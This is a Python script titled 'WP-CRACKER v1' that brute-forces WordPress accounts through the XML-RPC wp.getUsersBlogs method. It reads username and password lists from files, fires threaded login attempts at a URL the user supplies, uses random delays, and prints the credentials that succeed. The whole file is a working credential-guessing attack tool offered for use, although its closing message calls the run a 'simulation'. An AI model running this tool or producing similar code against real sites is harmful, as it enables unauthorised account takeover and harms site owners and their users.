import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import random
import sys
import os
import pyfiglet
from colorama import init, Fore, Style

# ==========================
# Initialize
# ==========================
init(autoreset=True)
os.system("cls" if os.name == "nt" else "clear")

# ==========================
# Logo & Banner
# ==========================
ascii_logo = pyfiglet.figlet_format("WP-CRACKER", font="slant")
print(Fore.CYAN + ascii_logo)
print(Fore.YELLOW + "--- WP-CRACKER v1 ---")
print(Fore.YELLOW + "GitHub: https://github.com/SmallSECURITY" + Style.RESET_ALL)

# ==========================
# User Inputs
# ==========================
URL = input(Fore.GREEN + "Enter your WordPress XML-RPC URL: " + Style.RESET_ALL).strip()
USER_FILE = "users.txt"
PASS_FILE = "passwords.txt"
THREADS = 5
DELAY_MIN = 0.1
DELAY_MAX = 0.5

# ==========================
# Read Users & Passwords
# ==========================
with open(USER_FILE, "r") as f:
    users = [line.strip() for line in f if line.strip()]

with open(PASS_FILE, "r") as f:
    passwords = [line.strip() for line in f if line.strip()]

# ==========================
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WP-Cracker-Test",
    "Content-Type": "text/xml"
}

total = len(users) * len(passwords)
counter = 0
spinner = ['|', '/', '-', '\\']

def test_login(user, pwd):
    global counter
    payload = f"""
    <methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
            <param><value><string>{user}</string></value></param>
            <param><value><string>{pwd}</string></value></param>
        </params>
    </methodCall>
    """
    time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
    
    try:
        response = requests.post(URL, data=payload, headers=HEADERS, timeout=5)
        success = "faultCode" not in response.text
    except:
        success = False
    
    counter += 1
    percent = (counter / total) * 100
    spin_char = spinner[counter % len(spinner)]
    
    sys.stdout.write(f"\r{Fore.BLUE}[{'#' * int(percent // 2):50}] {percent:.1f}% {spin_char}{Style.RESET_ALL}")
    sys.stdout.flush()
    
    if success:
        return user, pwd
    return None

# ==========================
# Multi-threaded Execution
# ==========================
successful = {}  # dict to prevent duplicates: user -> password

with ThreadPoolExecutor(max_workers=THREADS) as executor:
    futures = [executor.submit(test_login, u, p) for u in users for p in passwords]
    try:
        for f in as_completed(futures):
            result = f.result()
            if result:
                user, pwd = result
                if user not in successful:
                    successful[user] = pwd  # only first successful password per user
    finally:
        executor.shutdown(wait=True)

# ==========================
# Final Results
# ==========================
print("\n\n" + Fore.MAGENTA + "✅ Simulation Completed!" + Style.RESET_ALL)

if successful:
    print(Fore.GREEN + "💥 Successful combinations:" + Style.RESET_ALL)
    for u, p in successful.items():
        print(Fore.CYAN + f"User: {u} | Password: {p}" + Style.RESET_ALL)
else:
    print(Fore.RED + "❌ No successful combinations found." + Style.RESET_ALL)
